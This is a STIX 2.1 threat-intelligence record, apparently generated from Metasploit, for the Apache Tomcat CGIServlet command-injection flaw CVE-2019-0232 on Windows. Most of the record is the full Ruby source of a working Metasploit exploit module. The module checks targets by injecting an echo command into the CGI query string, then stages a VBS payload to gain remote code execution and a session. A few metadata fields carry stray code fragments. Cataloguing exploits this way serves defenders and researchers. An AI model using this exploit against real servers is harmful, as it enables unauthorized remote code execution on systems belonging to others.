{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--61023b35-b442-4159-9e6a-3d49c1d2542c",
    "created": "2024-08-14T16:53:17.695141Z",
    "modified": "2024-08-14T16:53:17.695146Z",
    "name": "Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability",
    "description": " This module exploits a vulnerability in Apache Tomcat's CGIServlet component. When the enableCmdLineArguments setting is set to true, a remote user can abuse this to execute system commands, and gain remote code execution.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/tomcat_cgi_cmdlineargs.rb",
            "external_id": "tomcat_cgi_cmdlineargs.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0232"
        },
        {
            "source_name": "reference",
            "url": "https://wwws.nightwatchcybersecurity.com/2019/04/30/remote-code-execution-rce-in-cgi-servlet-apache-tomcat-on-windows-cve-2019-0232/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'            => 'Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability',\n      'Description'     => %q{\n        This module exploits a vulnerability in Apache Tomcat's CGIServlet component. When the\n        enableCmdLineArguments setting is set to true, a remote user can abuse this to execute\n        system commands, and gain remote code execution.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Yakov Shafranovich', # Original discovery\n          'sinn3r'              # Metasploit module\n        ],\n      'Platform'        => 'win',\n      'Arch'            => [ARCH_X86, ARCH_X64],\n      'Targets'         =>\n        [\n          [ 'Apache Tomcat 9.0 or prior for Windows', { } ]\n        ],\n      'References'      =>\n        [\n          ['CVE', '2019-0232'],\n          ['URL', 'https://wwws.nightwatchcybersecurity.com/2019/04/30/remote-code-execution-rce-in-cgi-servlet-apache-tomcat-on-windows-cve-2019-0232/'],\n          ['URL', 'https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat/']\n        ],\n      'Notes'           =>\n        {\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultOptions'  =>\n        {\n          'RPORT' => 8080\n        },\n      'Privileged'      => false,\n      'DisclosureDate'  => '2019-04-10', # Date of public advisory issued by the vendor\n      'DefaultTarget'   => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to CGI script', '/'])\n      ])\n\n    deregister_options('SRVHOST', 'SRVPORT', 'URIPATH')\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    sig = Rex::Text.rand_text_alpha(10)\n    uri = normalize_uri(target_uri.path)\n    uri << \"?&echo+#{sig}\"\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    unless res\n      vprint_error('No Response from server')\n      return CheckCode::Unknown\n    end\n\n    if res.body.include?(sig)\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts={})\n    # Our command stager assumes we have access to environment variables.\n    # We don't necessarily have that, so we have to modify cscript to a full path.\n    cmd.gsub!('cscript', 'C:\\\\Windows\\\\System32\\\\cscript.exe')\n\n    uri = normalize_uri(target_uri.path)\n    uri << \"?&#{CGI.escape(cmd)}\"\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'No response from server')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::Unknown, \"Unexpected server response: #{res.code}\")\n    end\n  end\n\n  # it seems we don't really have a way to retrieve the filenames from the VBS command stager,\n  # so we need to rely on the user to cleanup the files.\n  def on_new_session(cli)\n    print_warning('Make sure to manually cleanup the exe generated by the exploit')\n    super\n  end\n\n  def exploit\n    execute_cmdstager(flavor: :vbs, temp: '.', linemax: 7000)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-10, # Date of public advisory issued by the vendor",
    "x_mitre_platforms": [
        "win'"
    ]
}